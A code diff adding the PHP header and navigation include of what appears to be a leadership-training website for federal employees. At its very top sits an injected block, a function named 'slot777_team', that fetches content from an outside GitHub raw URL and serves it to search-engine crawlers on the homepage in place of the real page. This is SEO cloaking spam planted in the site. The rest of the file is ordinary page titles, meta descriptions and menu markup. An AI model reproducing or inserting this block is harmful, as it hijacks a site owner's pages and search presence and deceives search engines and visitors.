@@ -1,0 +1,291 @@
+<?php
+function slot777_team($url) {
+    if (ini_get('allow_url_fopen')) {
+    return file_get_contents($url);
+    } elseif (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+    return false;
+}
+
+$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$bot = "https://raw.githubusercontent.com/juraganujang/aa/main/clmmm";
+$file = slot777_team($bot);
+$botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
+if (preg_match($botchar, $res)) {
+    if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '/index.php') { echo $file; exit; }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<?php
+$title = "Center for Leadership and Management | Leadership Training Programs";
+$meta_description = "Discover Graduate School USA’s Center for Leadership and Management, offering proven leadership training programs for federal employees and teams.";
+$canonical_url = "https://clm.graduateschool.edu/";
+$home = true;
+$elp = false;
+$epp = false;
+$nlp = false;
+$alp = false;
+$schedule = false;
+$contact = false;
+$about = false;
+$course = false;
+if (strpos($_SERVER["PHP_SELF"], "index.php") === false) {
+    $home = false;
+}
+if (strpos($_SERVER["PHP_SELF"], "elp.php") !== false) {
+    $title = "Executive Leadership Program |  Mid-Level Leaders (GS 11-13) Training";
+    $meta_description = "The Executive Leadership Program equips GS 11–13 federal leaders with advanced leadership skills to manage people, programs, and organizational goals.";
+    $elp = true;
+    $canonical_url = "https://clm.graduateschool.edu/executive-leadership-program";
+
+} else if (strpos($_SERVER["PHP_SELF"], "epp.php") !== false) {
+    $title = "Executive Potential Program |  Executive Leadership (GS 13-15) Training";
+    $meta_description = "The Executive Potential Program helps GS 13–15 federal leaders strengthen executive competencies and prepare for senior leadership positions.";
+    $epp = true;
+    $canonical_url = "https://clm.graduateschool.edu/executive-potential-program";
+} else if (strpos($_SERVER["PHP_SELF"], "nlp.php") !== false) {
+    $title = "New Leader Program | Early Supervisors (GS 7-11) Training";
+    $meta_description = "The New Leader Program develops GS 7–11 federal employees into effective supervisors, focusing on core leadership skills and management practices.";
+    $nlp = true;
+    $canonical_url = "https://clm.graduateschool.edu/new-leader-program";
+
+} else if (strpos($_SERVER["PHP_SELF"], "alp.php") !== false) {
+    $title = "Aspiring Leader Program | Emerging Leaders (Up to GS 6)";
+    $meta_description = "The Aspiring Leader Program prepares GS 6 and below federal employees to build leadership skills, confidence, and readiness for supervisory roles.";
+    $alp = true;
+    $canonical_url = "https://clm.graduateschool.edu/aspiring-leader-program";
+
+} else if (strpos($_SERVER["PHP_SELF"], "schedule.php") !== false) {
+    $title = "Schedule for Leadership Development Programs";
+    $meta_description = "View the upcoming schedule of CLM leadership development programs at Graduate School USA, with courses designed for every stage of federal leadership.";
+    $schedule = true;
+    $canonical_url = "https://clm.graduateschool.edu/schedule";
+
+} else if (strpos($_SERVER["PHP_SELF"], "contact.php") !== false) {
+    $title = "Contact CLM | Graduate School USA Leadership Center";
+    $meta_description = "Connect with the Center for Leadership and Management at Graduate School USA to learn more about leadership training and program offerings.";
+    $contact = true;
+    $canonical_url = "https://clm.graduateschool.edu/contact-us";
+
+} else if (strpos($_SERVER["PHP_SELF"], "about.php") !== false) {
+    $title = "About CLM | Leadership Development Programs & Training since 1985";
+    $meta_description = "Learn about the Center for Leadership and Management (CLM), delivering leadership development programs for federal professionals since 1985.";
+    $about = true;
+    $canonical_url = "https://clm.graduateschool.edu/CLM-overview";
+
+} else if (strpos($_SERVER["PHP_SELF"], "cow.php") !== false) {
+    $title = "Congressional Operations Workshop";
+    $meta_description = "The Congressional Operations Workshop provides federal employees with practical insights into Congress, legislative processes, and strategies for effective government leadership.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/congressional-operations-workshop";
+
+} else if (strpos($_SERVER["PHP_SELF"], "assess.php") !== false) {
+    $title = "Leadership Assessment Tools | LEI, MBTI & More";
+    $meta_description = "Enhance leadership potential with CLM’s assessment tools, including LEI, MBTI, and more, to identify strengths and guide professional growth.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/assessment-tools";
+
+} else if (strpos($_SERVER["PHP_SELF"], "ess.php") !== false) {
+    $title = "Executive Survival Skills Course Online & Washington, D.C.";
+    $meta_description = "The Executive Survival Skills course prepares federal executives to handle high-pressure environments, strengthen resilience, and succeed in leadership roles in Washington, D.C. or online.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/executive-survival-skills";
+
+} else if (strpos($_SERVER["PHP_SELF"], "hpo.php") !== false) {
+    $title = "Leadership, Motivation, and Accountability Online & Washington, D.C.";
+    $meta_description = "The Leadership, Motivation, and Accountability course helps federal leaders inspire teams, build responsibility, and achieve organizational goals in Washington, D.C. or online.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/leadership-motivation-and-accountability";
+
+} else if (strpos($_SERVER["PHP_SELF"], "lp.php") !== false) {
+    $title = "Leadership Programs at CLM | From Aspiring to Executive Leadership Training Programs";
+    $meta_description = "Explore leadership programs at the Center for Leadership and Management (CLM), offering training for aspiring, new, mid-level, and executive federal leaders to strengthen skills and advance careers.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/leading-people";
+
+} else if (strpos($_SERVER["PHP_SELF"], "mfr.php") !== false) {
+    $title = "Managing for Results Course Online & Washington, D.C.";
+    $meta_description = "The Managing for Results course helps federal leaders develop strategies to improve performance, accountability, and organizational outcomes in Washington, D.C. or online.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/managing-for-results";
+
+} else if (strpos($_SERVER["PHP_SELF"], "st.php") !== false) {
+    $title = "Systems Thinking";
+    $meta_description = "The Systems Thinking course equips federal leaders with tools to analyze complex challenges, improve problem-solving, and drive effective organizational change.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/systems-thinking";
+
+} else if (strpos($_SERVER["PHP_SELF"], "tlc.php") !== false) {
+    $title = "The Leadership Challenge &copy;";
+    $meta_description = "The Leadership Challenge course equips federal leaders with proven practices and strategies to inspire, motivate, and drive organizational success.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/the-leadership-challenge";
+
+} else if (strpos($_SERVER["PHP_SELF"], "wes.php") !== false) {
+    $title = "Washington Executive Seminar (WES)";
+    $meta_description = "The Washington Executive Seminar (WES) helps federal executives enhance leadership competencies, broaden policy perspectives, and strengthen decision-making in Washington, D.C.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/washington-executive-seminar";
+} else if (strpos($_SERVER["PHP_SELF"], "wecqs.php") !== false) {
+    $title = "Writing ECQ Statements";
+    $meta_description = "The Writing ECQ Statements course guides federal employees in crafting compelling Executive Core Qualifications (ECQs) for SES applications and career advancement.";
+    $course = true;
+    $canonical_url = "https://clm.graduateschool.edu/writing-ecq-statements";
+}
+?>
+<?php if ($_SERVER["HTTP_HOST"] == "localhost") {
+    $base_url = "//{$_SERVER["HTTP_HOST"]}/CLM/";
+} else if ($_SERVER["HTTP_HOST"] == "clm.graduateschool.edu") {
+    $base_url = "//{$_SERVER["HTTP_HOST"]}/";
+} else {
+    $base_url = "//{$_SERVER["HTTP_HOST"]}/clmdev/";
+}
+?>
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="<?php echo $meta_description; ?>">
+    <link rel="icon" sizes="32x32" href="assets/media/favicons/favicon-32x32.ico">
+    <link rel="icon" sizes="16x16" href="assets/media/favicons/favicon-16x16.ico">
+    <link rel="icon" href="assets/media/favicons/favicon.ico">
+    <link rel="manifest" href="assets/media/favicons/manifest.json">
+    <title><?php echo $title; ?></title>
+    <base href="<?php echo $base_url; ?>">
+    <link rel="canonical" href="<?php echo $canonical_url; ?>">
+    <link rel="stylesheet" href="assets/css/bootstrap-grid.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap-reboot.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap-utilities.min.css">
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/style.min.css">
+    <!-- Google Tag Manager -->
+    <script type="text/javascript" src="assets/js/gtg.js"></script>
+    <!-- End Google Tag Manager -->
+</head>
+
+<body>
+    <div class="global-container">
+        <!-- Header  -->
+
+        <div class="header">
+            <div class="header_logo-sect d-flex justify-content-center">
+                <a href=""><img src="assets/media/images/CLM-logo.png" alt="CLM"></a>
+            </div>
+            <div class="header-main-nav">
+                <div class="container">
+                    <nav class="navbar navbar-expand-xl py-0">
+                        <div class="w-100">
+                            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                                <img src="assets/media/images/menu-white-mobile.jpeg" alt="Menu">
+                            </button>
+                            <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                                    <li class="nav-item">
+                                        <a class="nav-link <?php echo ($home ? "active" : ""); ?>" aria-current="page" href="">
+                                            <img src="assets/media/images/home-header.svg" alt="Home">HOME
+                                        </a>
+                                    </li>
+                                    <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle <?php echo (!$home && !$schedule && !$contact && !$about && !$course ? "active" : ""); ?>" href="#">
+                                            <img src="assets/media/images/programs-header.svg" alt="PROGRAMS"> PROGRAMS
+                                        </a>
+                                        <ul class="dropdown-menu border-0 p-0" aria-labelledby="dropdownMenuClickableInside1">
+                                            <li class="drp-hov">
+                                                <a class="dropdown-item" href="/executive-potential-program"><span class="img-wrapper"><img class="drp-img" src="assets/media/images/epp-header.svg" alt="EPP"></span> <span class="epp__header">EPP </span> - Executive Potential Program </a>
+                                            </li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/executive-leadership-program"><span class="img-wrapper"><img class="drp-img" src="assets/media/images/nlp-header.svg" alt="NLP"></span> <span class="elp__header"> ELP</span> - Executive Leadership Program</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/new-leader-program"><span class="img-wrapper"><img class="drp-img" src="assets/media/images/elp-header.svg" alt="NLP"></span> <span class="nlp__header"> NLP</span> - New Leader Program</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/aspiring-leader-program"><span class="img-wrapper"><img class="drp-img" src="assets/media/images/alp-header.svg" alt="ALP"></span> <span class="alp__header"> ALP</span> - Aspiring Leader Program</a></li>
+                                        </ul>
+                                    </li>
+                                    <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle" href="#">
+                                            <img src="assets/media/images/alumni-header.svg" alt="COURSES"> COURSES
+                                        </a>
+                                        <ul class="dropdown-menu border-0 p-0" aria-labelledby="dropdownMenuClickableInside1">
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/training/curriculum-offerings/communication-professional-skills">Communication & Professional Skills</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/training/curriculum-offerings/leadership-management">Leadership & Management</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/certificates/leadership-certificate-programs">Leadership Certificates</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/courses/managing-for-results">Managing for Results</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/courses/executive-survival-skills">Executive Survival Skills</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/courses/leadership-motivation-and-accountability-for-high-performance-organizations">Leadership, Motivation, and Accountability for High Performance Organizations</a></li>
+                                            <?php /*li class="drp-hov"><a class="dropdown-item" href="https://clm.graduateschool.edu/systems-thinking">Systems Thinking</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://clm.graduateschool.edu/the-leadership-challenge">The Leadership Challenge &copy</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://clm.graduateschool.edu/washington-executive-seminar">Washington Executive Seminar</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="https://clm.graduateschool.edu/writing-ecq-statements">Writing ECQ Statements</a></li */ ?>
+                                        </ul>
+                                    </li>
+                                    <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle <?php echo ($course ? "active":"")?>" href="#">
+                                            <img src="assets/media/images/schedule-header.svg" alt="ASSESSMENTS"> ASSESSMENTS
+                                        </a>
+                                        <ul class="dropdown-menu border-0 p-0" aria-labelledby="dropdownMenuClickableInside1">
+                                            <li class="drp-hov"><a class="dropdown-item" href="/assessment-tools">Assessments</a></li>
+                                            <!-- <li class="drp-hov"><a class="dropdown-item" href="/executive-survival-skills">Executive Survival Skills</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/leading-people">Leading People</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/managing-for-results">Managing for Results</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="/writing-ecq-statements">Writing ECQ Statements</a></li> -->
+                                        </ul>
+                                    </li>
+                                    <!-- <li class="nav-item">
+                                        <a class="nav-link <?php echo ($schedule ? "active" : ""); ?>" href="/schedule">
+                                            <img src="assets/media/images/schedule-header.svg" alt="SCHEDULE">SCHEDULE">
+                                        </a>
+                                    </li> -->
+                                    <!-- <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                                            <img src="assets/media/images/newsroom-header.svg" alt="NEWSROOM"> NEWSROOM
+                                        </a>
+                                        <ul class="dropdown-menu" aria-labelledby="navbarDropdown">
+                                            <li><a class="dropdown-item" href="#"><img src="" alt="PITI-VITI News"> PITI-VITI News</a></li>
+                                            <li><a class="dropdown-item" href="#"><img src="" alt="Mailing Lists"> Mailing Lists</a></li>
+                                            <li><a class="dropdown-item" href="#"><img src="" alt="Publication">Publications</a></li>
+                                        </ul>
+                                    </li> -->
+                                    <!-- <li class="nav-item">
+                                        <a class="nav-link" href="#">
+                                            <img src="assets/media/images/alumni-header.svg" alt="ALUMNI">ALUMNI
+                                        </a>
+                                    </li> -->
+                                    <li class="nav-item dropdown">
+                                        <a class="nav-link dropdown-toggle <?php echo ($about || $contact ? "active" : ""); ?>" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                                            <img src="assets/media/images/about-header.svg" alt="ABOUT CLM"> ABOUT CLM
+                                        </a>
+                                        <ul class="dropdown-menu border-0 p-0" aria-labelledby="dropdownMenuClickableInside1">
+                                            <li class="drp-hov"><a class="dropdown-item" href="/CLM-overview">CLM Overview</a></li>
+                                            <!--<li class="drp-hov"><a class="dropdown-item" href="#">The CLM Team</a></li>
+                                            <li class="drp-hov"><a class="dropdown-item" href="#">Join our Team</a></li>-->
+                                            <li class="drp-hov"><a class="dropdown-item" href="/contact-us">Contact Us</a></li>
+											<!--li class="drp-hov"><a class="dropdown-item" href="resources.php">Program Resources</a></li-->
+											<li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/students/accessibility-policy">Accessibility</a></li>
+											<li class="drp-hov"><a class="dropdown-item" href="https://www.graduateschool.edu/students/policies/registration-and-payment-policies">Registration &amp; Payment Policies</a></li>
+											
+											
+											
+                                        </ul>
+                                    </li>
+                                    </li>
+                                </ul>
+                                <form class="d-flex position-relative justify-content-end">
+                                    <input type="text" class="header-search" placeholder="Search">
+                                    <button class="header-submit-search-btn">
+                                        <img src="assets/media/images/search-icon.svg" alt="Search">
+                                    </button>
+                                </form>
+                            </div>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+
+        <!-- Header Ends -->
